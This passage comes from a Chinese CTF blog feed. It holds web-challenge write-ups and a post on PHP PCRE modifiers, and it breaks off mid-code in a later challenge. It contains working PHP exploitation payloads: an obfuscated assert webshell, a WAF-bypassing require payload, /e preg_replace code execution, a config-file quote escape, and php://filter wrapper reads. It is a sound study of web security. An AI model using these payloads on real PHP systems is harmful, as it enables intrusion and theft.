%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b&#x2F;&#x2F;</code></pre><p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p><h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;It&#39;s no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include &quot;config.php&quot;;if (isset($_GET[&#39;view_source&#39;])) &#123;    show_source(__FILE__);    die;&#125;function checkCookie($s) &#123;    $arr &#x3D; explode(&#39;:&#39;, $s);    if ($arr[0] &#x3D;&#x3D;&#x3D; &#39;&#123;&quot;secret&quot;&#39; &amp;&amp; preg_match(&#39;&#x2F;^[\&quot;0-9A-Z]*&#125;$&#x2F;&#39;, $arr[1]) &amp;&amp; count($arr) &#x3D;&#x3D;&#x3D; 2 ) &#123;        return true;    &#125; else &#123;        if ( !theFirstTimeSetCookie() ) setcookie(&#39;secret&#39;, &#39;&#39;, time()-1);        return false;    &#125;&#125;function haveFun($_f_g) &#123;    $_g_r &#x3D; 32;    $_m_u &#x3D; md5($_f_g);    $_h_p &#x3D; strtoupper($_m_u);    for ($i &#x3D; 0; $i &lt; $_g_r; $i++) &#123;        $_i &#x3D; substr($_h_p, $i, 1);        $_i &#x3D; ord($_i);        print_r($_i &amp; 0xC0);    &#125;    die;&#125;isset($_COOKIE[&#39;secret&#39;]) ? $json &#x3D; $_COOKIE[&#39;secret&#39;] : setcookie(&#39;secret&#39;, &#39;&#123;&quot;secret&quot;:&quot;&#39; . strtoupper(md5(&#39;y1ng&#39;)) . &#39;&quot;&#125;&#39;, time()+7200 );checkCookie($json) ? $obj &#x3D; @json_decode($json, true) : die(&#39;no&#39;);if ($obj &amp;&amp; isset($_GET[&#39;give_me_shell&#39;])) &#123;    ($obj[&#39;secret&#39;] !&#x3D; $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;&#125;die;</code></pre><p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p><p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p><p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret=&#123;&quot;secret&quot;:115&#125;</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();&#x2F;&#x2F;there are some secret waf that you will never know, fuzz me if you canrequire &quot;hidden_filter.php&quot;;if (!$_SESSION[&#39;login&#39;])    die(&#39;&lt;script&gt;location.href&#x3D;\&#39;.&#x2F;index.php\&#39;&lt;&#x2F;script&gt;&#39;);if (!isset($_GET[&#39;code&#39;])) &#123;    show_source(__FILE__);    exit();&#125; else &#123;    $code &#x3D; $_GET[&#39;code&#39;];    if (!preg_match($secret_waf, $code)) &#123;        &#x2F;&#x2F;清空session 从头再来        eval(&quot;\$_SESSION[&quot; . $code . &quot;]&#x3D;false;&quot;); &#x2F;&#x2F;you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker    &#125; else die(&#39;hacker&#39;);&#125;&#x2F;* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! *  ————Deep CTF 2020*&#x2F;</code></pre><p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li><li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li><li>使用<code>require</code>可以不需要括号</li><li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li></ul><p>得到<code>flag.txt</code>内容：</p><pre class="language-none"><code class="language-none">可以，说明你ctfshow的红包2没白做，flag在&#x2F;flag，同样的方法去读取吧。1]&#x3D;false;</code></pre><p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“温故而知新，可以为师矣”——孔子《论语》&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php正则表达式(PCRE)模式修饰符</title>
    <link href="https://www.extrader.top/posts/57833c1a/"/>
    <id>https://www.extrader.top/posts/57833c1a/</id>
    <published>2020-05-19T10:24:20.000Z</published>
    <updated>2020-05-19T10:24:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>php单双引号的区别：</p><p>单引号：php不会读取里面的变量，作为纯字符串处理</p><p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p><p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html">详见</a></p><a id="more"></a><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>使得模式大小写不敏感</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>使得模式匹配上任意行之后就返回true</p><p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>使得<code>.</code>可以匹配换行符</p><p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>使得<code>$</code>不匹配换行符</p><p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>使得可以在模式中添加注释</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p><p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>$&#123;&#125;</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a>的原因，<code>$&#123;&#125;</code>中包裹的字符则会当做代码执行</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><strong>$匹配换行问题</strong></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p><p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p><p>那么该如何解决这种问题呢？</p><p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><strong>正则替换</strong></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p><p>有如下代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$api &#x3D; addslashes($_GET[&#39;api&#39;]);$file &#x3D; file_get_contents(&#39;.&#x2F;option.php&#39;);$file &#x3D; preg_replace(&quot;&#x2F;\\\$API &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$API &#x3D; &#39;&#123;$api&#125;&#39;;&quot;, $file);file_put_contents(&#39;.&#x2F;option.php&#39;, $file);</code></pre><p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p><p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;;phpinfo();&#39;;</code></pre><p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;$API &#x3D; &#39;;phpinfo();&#39;;&#39;;</code></pre><p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p><ul><li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li><li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\$&#123;1&#125;</code>的形式。</li></ul><p>再来看看<code>preg_replace</code>的具体使用方法</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><strong>巨人的肩膀</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHP模式修饰符</a></li></ul><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a><em>栗子</em></h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a><strong>BJDCTF2020-ZJCTF—不过如此</strong></h4><p>首先题目先给出了一段代码：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>构造<code>payload</code>读取<code>next.php</code>的内容</p><pre class="language-php" data-language="php"><code class="language-php">http:&#x2F;&#x2F;e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>将读到的base64解码得到<code>next.php</code>文件的内容</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$id &#x3D; $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] &#x3D; $id;function complex($re, $str) &#123;    return preg_replace(        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re &#x3D;&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造：</p><p><code>payload</code>：<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，</p><p>也可以利用里面的<code>getFlag</code>方法<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php单双引号的区别：&lt;/p&gt;
&lt;p&gt;单引号：php不会读取里面的变量，作为纯字符串处理&lt;/p&gt;
&lt;p&gt;双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如&lt;code&gt;\n&lt;/code&gt;，&lt;code&gt;\0&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，&lt;a href=&quot;https://www.laruence.com/2008/08/19/338.html&quot;&gt;详见&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="正则" scheme="https://www.extrader.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-LoveMath-php动态函数执行</title>
    <link href="https://www.extrader.top/posts/a649e496/"/>
    <id>https://www.extrader.top/posts/a649e496/</id>
    <published>2020-05-17T09:53:48.000Z</published>
    <updated>2020-05-17T09:53:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>  先看到题目给出的源码：</p><a id="more"></a><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo 